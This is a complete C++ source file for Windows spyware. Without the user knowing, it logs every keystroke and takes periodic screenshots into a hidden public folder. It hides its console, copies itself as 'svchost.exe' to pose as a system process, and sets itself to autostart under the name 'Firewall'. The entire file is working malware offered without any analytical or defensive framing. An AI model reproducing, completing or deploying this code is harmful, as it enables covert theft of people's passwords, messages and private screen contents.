#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <direct.h>
#include <io.h>
#include "Utils.h"

using namespace std;

Utils util;

void WriteData(string input) {

	ofstream LogFile;
	LogFile.open("C:\\Users\\Public\\Public\\keylogs.txt", fstream::app);

	LogFile << input;

	if (input == " **ENTER** ") {
		LogFile << endl;
	}

	LogFile.close();
}

bool SpecialKeys(int vKey) {

	switch (vKey) {
	case VK_SPACE:
		cout << " **SPACE** ";
		WriteData(" **SPACE** ");
		return true;

	case VK_RETURN:
		cout << " **ENTER** ";
		cout << endl;
		WriteData(" **ENTER** ");
		return true;

		/*case VK_SHIFT:
			cout<<" **SHIFT** ";
			WriteData(" **SHIFT** ");
			return true;*/

	case VK_BACK:
		cout << " **BACKSPACE** ";
		WriteData(" **BACKSPACE** ");
		return true;

	case VK_RBUTTON:
		cout << " **RIGHT_CLICK** ";
		WriteData(" **RIGHT_CLICK** ");
		return true;

	case VK_LBUTTON:
		cout << " **LEFT_CLICK** ";
		WriteData(" **LEFT_CLICK** ");
		return true;

	case VK_CAPITAL:
		cout << " **CAPS_LOCK** ";
		WriteData(" **CAPS_LOCK** ");
		return true;

	case VK_TAB:
		cout << " **TAB** ";
		WriteData(" **TAB** ");
		return true;

	case VK_UP:
		cout << " **UP** ";
		WriteData(" **UP_ARROW_KEY** ");
		return true;

	case VK_DOWN:
		cout << " **DOWN** ";
		WriteData(" **DOWN_ARROW_KEY** ");
		return true;

	case VK_LEFT:
		cout << " **LEFT** ";
		WriteData(" **LEFT_ARROW_KEY** ");
		return true;

	case VK_RIGHT:
		cout << " **RIGHT** ";
		WriteData(" **RIGHT_ARROW_KEY** ");
		return true;

		/*case VK_CONTROL:
			cout<<" **CONTROL** ";
			WriteData(" **CONTROL** ");
			return true;*/

	case VK_MENU:
		cout << " **ALT** ";
		WriteData(" **ALT** ");
		return true;

	case VK_F1:
		cout << " **F1** ";
		WriteData(" **F1** ");
		return true;

	case VK_F2:
		cout << " **F2** ";
		WriteData(" **F2** ");
		return true;

	case VK_F3:
		cout << " **F3** ";
		WriteData(" **F3** ");
		return true;

	case VK_F4:
		cout << " **F4** ";
		WriteData(" **F4** ");
		return true;

	case VK_F5:
		cout << " **F5** ";
		WriteData(" **F5** ");
		return true;

	case VK_F6:
		cout << " **F6** ";
		WriteData(" **F6** ");
		return true;

	case VK_F7:
		cout << " **F7** ";
		WriteData(" **F7** ");
		return true;

	case VK_F8:
		cout << " **F8** ";
		WriteData(" **F8** ");
		return true;

	case VK_F9:
		cout << " **F9** ";
		WriteData(" **F9** ");
		return true;

	case VK_F10:
		cout << " **F10** ";
		WriteData(" **F10** ");
		return true;

	case VK_F11:
		cout << " **F11** ";
		WriteData(" **F11** ");
		return true;

	case VK_F12:
		cout << " **F12** ";
		WriteData(" **F12** ");
		return true;

	case VK_ESCAPE:
		cout << " **ESCAPE** ";
		WriteData(" **ESCAPE** ");
		return true;

	case VK_END:
		cout << " **END** ";
		WriteData(" **END** ");
		return true;

	case VK_HOME:
		cout << " **HOME** ";
		WriteData(" **HOME** ");
		return true;

	case VK_DELETE:
		cout << " **DELETE** ";
		WriteData(" **DELETE** ");
		return true;

	case VK_SNAPSHOT:
		cout << " **SNAPSHOT** ";
		WriteData(" **SNAPSHOT** ");
		return true;

	case VK_SCROLL:
		cout << " **SCROLL_LOCK** ";
		WriteData(" **SCROLL_LOCK** ");
		return true;

	case VK_NUMPAD0:
		cout << "0";
		WriteData("0");
		return true;

	case VK_NUMPAD1:
		cout << "1";
		WriteData("1");
		return true;

	case VK_NUMPAD2:
		cout << "2";
		WriteData("2");
		return true;

	case VK_NUMPAD3:
		cout << "3";
		WriteData("3");
		return true;

	case VK_NUMPAD4:
		cout << "4";
		WriteData("4");
		return true;

	case VK_NUMPAD5:
		cout << "5";
		WriteData("5");
		return true;

	case VK_NUMPAD6:
		cout << "6";
		WriteData("6");
		return true;

	case VK_NUMPAD7:
		cout << "7";
		WriteData("7");
		return true;

	case VK_NUMPAD8:
		cout << "8";
		WriteData("8");
		return true;

	case VK_NUMPAD9:
		cout << "9";
		WriteData("9");
		return true;

	case VK_MULTIPLY:
		cout << "*";
		WriteData("*");
		return true;

	case VK_ADD:
		cout << "+";
		WriteData("+");
		return true;

	case VK_SUBTRACT:
		cout << "-";
		WriteData("-");
		return true;

	case VK_DECIMAL:
		cout << ".";
		WriteData(".");
		return true;

	case VK_DIVIDE:
		cout << "/";
		WriteData("/");
		return true;

	case VK_OEM_PERIOD:
		cout << ".";
		WriteData(".");
		return true;

	case VK_OEM_1:
		cout << ";:";
		WriteData(";:");
		return true;

	case VK_OEM_2:
		cout << "/?";
		WriteData("/?");
		return true;

	case VK_OEM_3:
		cout << "`~";
		WriteData("`~");
		return true;

	case VK_OEM_4:
		cout << "[{";
		WriteData("[{");
		return true;

	case VK_OEM_5:
		cout << "|";
		WriteData("|");
		return true;

	case VK_OEM_6:
		cout << "]}";
		WriteData("]}");
		return true;

	case VK_OEM_7:
		cout << "''";
		WriteData("''");
		return true;

	case VK_OEM_COMMA:
		cout << ",";
		WriteData(",");
		return true;

	case VK_OEM_PLUS:
		cout << "+=";
		WriteData(";");
		return true;

	case VK_OEM_MINUS:
		cout << "-_";
		WriteData("-_");
		return true;

	case VK_PRIOR:
		cout << " **PAGE_UP** ";
		WriteData(" **PAGE_UP** ");
		return true;

	case VK_NEXT:
		cout << " **PAGE_DOWN** ";
		WriteData(" **PAGE_DOWN** ");
		return true;

	case VK_NUMLOCK:
		cout << " **NUMLOCK** ";
		WriteData(" **NUMLOCK** ");
		return true;

	case VK_LWIN:
		cout << " **WIN** ";
		WriteData(" **WIN** ");
		return true;

	case VK_LSHIFT:
		cout << " **LEFT_SHIFT** ";
		WriteData(" **LEFT_SHIFT** ");
		return true;

	case VK_RSHIFT:
		cout << " **RIGHT_SHIFT** ";
		WriteData(" **RIGHT_SHIFT** ");
		return true;

	case VK_LCONTROL:
		cout << " **LEFT_CONTROL** ";
		WriteData(" **LEFT_CONTROL** ");
		return true;

	case VK_RCONTROL:
		cout << " **RIGHT_CONTROL** ";
		WriteData(" **RIGHT_CONTROL** ");
		return true;

	default:
		return false;
	}
}

int ScreenX = GetSystemMetrics(SM_CXSCREEN);
int ScreenY = GetSystemMetrics(SM_CYSCREEN);

void logger() {
	ofstream LogFile;
	LogFile.open("C:\\Users\\Public\\Public\\keylogs.txt", fstream::trunc);
	LogFile.close();

	char key;

	while (true) {
		Sleep(10);
		for (int key = 0; key <= 255; key++) {
			if (GetAsyncKeyState(key) & 0x0001) {
				if (SpecialKeys(key) == false) {

					LogFile.open("C:\\Users\\Public\\Public\\keylogs.txt", fstream::app);

					cout << char(key);
					LogFile << char(key);

					LogFile.close();
				}
			}
		}
	}
}

void screens() {
	char alph[] = "qwertyuiopsdfghjklzxcvbnm";
	int i = 0, d = 0, j = 0;
	const string start = "C:\\Users\\Public\\Public\\Screens\\screenshot";

	while (true) {
		Sleep(50000);

		string screen = start + (char)(j + 48) + (char)(i + 48) + (char)(d + 48) + ".bmp";
		char* bmp = new char[screen.size() + 1];

		strcpy(bmp, screen.c_str());

		util.Screenshot(0, 0, 1920, 1080, (char*)(bmp), NULL);

		d++;

		if (d == 10) {
			d = 0;
			i++;
		}

		if (i == 10) {
			i = 0;
			j++;
		}
	}
}

int main() {

	if (_access("C:\\Users\\Public\\Public", 0)) {
		_mkdir("C:\\Users\\Public\\Public");
	}

	if (_access("C:\\Users\\Public\\Public\\Screens", 0)) {
		_mkdir("C:\\Users\\Public\\Public\\Screens");
	}

	string s = util.FindPath();
	wstring stemp = wstring(s.begin(), s.end());
	LPCWSTR path = stemp.c_str();

	CopyFile(path, L"C:\\Users\\Public\\Public\\svchost.exe", TRUE);

	string screen = "C:\\Users\\Public\\Public\\Screens\\screenshot.bmp";
	char* bmp = new char[screen.size() + 1];

	strcpy(bmp, screen.c_str());

	util.HideConsole();
	//util.Autoload("hack.exe", util.FindPath());
	util.Autoload("Firewall", "C:\\Users\\Public\\Public\\svchost.exe");
	util.Screenshot(0, 0, 1920, 1080, (char*)(bmp), NULL);

	thread logger(logger);

	thread screens(screens);

	if (logger.joinable())
		logger.join();

	if (screens.joinable())
		screens.join();

	delete[] bmp;

	return 0;
}